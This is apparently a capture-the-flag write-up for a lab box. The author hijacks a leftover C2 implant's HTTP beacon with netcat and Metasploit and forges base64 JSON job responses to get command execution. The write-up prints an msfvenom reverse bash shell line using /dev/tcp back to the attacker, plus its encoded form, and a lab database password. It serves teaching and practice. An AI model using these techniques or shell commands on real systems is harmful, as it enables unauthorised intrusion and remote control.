# Forgotten implant

Forgotten implant. Quite an original box on how to get into an already hacked device where the C2 implant was not removed.

With the help of the forgotten implant you must gain entry again.


## Getting in

As always, start with nmap

nmap -sC -sV -T5 -p- ${IP} -vv -oN box

But it does not find any open ports.

Ok, maybe udp? That matters sometimes. But since udp scan are SLOW as fok, better pass --top-ports 1024 to nmap.

nmap -sC -sV -sU -T5 --top-ports 1024 -vv -oN box ${IP}

blabla
Host is up, received reset ttl 63 (0.032s latency).
Skipping host 10.10.243.126 due to host timeout
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done -- 1 IP address (1 host up) scanned in 905.67 seconds

Nothing!

ok thats new, but as the hint says

"Your port scan is not misleading you"

this must be by design.

Knowing how C2 systems work, then it is only logical that the machine is sending data out and not in.
It's probably sending a beacon, asking the server what to do.

So let's see what tcpdump has to say on the vpn's network interface. tun0

```
sudo tcpdump -i tun0
```

17:42:04.029478 IP ${LIP}.81 > 10.10.169.196.43862: Flags [R.], seq 0, ack 3660637020, win 0, length 0

So it seems that something is sending packets to port 81. okay...

then lets see what by starting netcat.

```
nc -lnvp 81 
```

After some seconds an http request comes in written with python's requests package.

```
GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDhUMTU6NDQ6MDEuODkyOTY5IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1
Host: 10.9.6.179:81
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

it's sending a beacon to /heartbeat with base64.

the decoded base64 means.

```
{"systeminfo": {"os": "Linux", "hostname": "forgottenimplant"}, "latest_job": {"job_id": 0, "cmd": "whoami"}, "success": false}
```

Aha! It's querying for commands/jobs to do.

Well then, then there are a few options. 

1. We can write a server with a heartbeat endpoint.
2. We can use a real C2 like metasploit

Let's go for option 2, since this box is all about C2.

So fire up metasploit. metasploit -q.
And start catching the beacon with payload meterpreter/reverse_http.

```
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_http

set LPORT 81
set LHOST tun0

run

[*] Started HTTP reverse handler
```

Soon the requests come in and metasploit prints them.

[*] http:/IP:81 handling request from 10.10.243.126; (UUID: g6wztzlc) Unknown request to /heartbeat/eyJ0aW1lIjogIjIwMjMtMDctMzBUMDc6MDQ6MDEuODcyNTQ2IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAiY2F0IHVzZXIudHh0IiwgInN1Y2Nlc3MiOiB0cnVlLCAicmVzdWx0IjogIlRITXs5MDJlOGU4YjFmNDlkZmViNjc4ZTQxOTkzNWJlMjNlZn1cbiJ9LCAic3VjY2VzcyI6IGZhbHNlfQ== with UA 'python-requests/2.22.0'

So we need to send messages back and with the reverse_http payload all http headers and body and what not can be manipulated.
"show advanced" in meterpreter and there we have HttpUnknownRequestResponse. That's exactly what metasploit is saying! unknown request.

First try to get command execution by base64 encoding a simple ls.

```
{"job_id": 0, "cmd": "ls"}
```

Cyberchef is a handy tool for base64 encoding, base64 clutters up your history IMO.

So:
set HttpUnknownRequestResponse eyJqb2JfaWQiOiAwLCAiY21kIjogImxzIn0=

And wait. The beacon comes back with.....

"Unknown request to /job-result/eyJqb2JfaWQiOiAwLCAiY21kIjogImxzIiwgInN1Y2Nlc3MiOiB0cnVlLCAicmVzdWx0IjogInByb2R1Y3RzLnB5XG51c2VyLnR4dFxuIn0="

and that base64 string means....

"{"job_id": 0, "cmd": "ls", "success": true, "result": "products.py\nuser.txt\n"}"

We have command execution!

So yeah lets generate a shell with msfvenom and encode it inside the json.

```
msfvenom -p cmd/unix/reverse_bash lhost=tun0 lport=10666 R
```

[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 70 bytes
bash -c '0<&94-;exec 94<>/dev/tcp/IP/10666;sh <&94 >&94 2>&94'

So encoded to base64 we get.

```
set HttpUnknownRequestResponse eyJqb2JfaWQiOiAwLCAiY21kIjogImJhc2ggLWMgJzA8JjEyNy07ZXhlYyAxMjc8Pi9kZXYvdGNwLzEwLjkuNi4xNzkvMTA2NjY7c2ggPCYxMjcgPiYxMjcgMj4mMTI3JyJ9
```

run

start another metasploit and set the payload to cmd/unix/reverse_bash

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp and the correct port and interface
msf6 exploit(multi/handler) > set payload cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash

run
Then run the http payload and wait.
Soon we get "[*] Accepted the first client connection..." but thats not enough, no real shell is generated.

and we have shell from the beacon

type shell in metasploit to upgrade to proper bash shell.

from there it's time to go for root, that is covered in other writeups. I tried with metasploit's post exploitation modules.

```
ada@forgottenimplant:~$ cat products.py
cat products.py
import mysql.connector

db = mysql.connector.connect(
    host='localhost', 
    database='app', 
    user='app', 
    password='s4Ucbrme'
    )

cursor = db.cursor()
cursor.execute('SELECT * FROM products')

for product in cursor.fetchall():
    print(f'We have {product[2]}x {product[1]}')

    mysql -h localhost -u app -p
mysql -h localhost -u app -p
Enter password: s4...
```
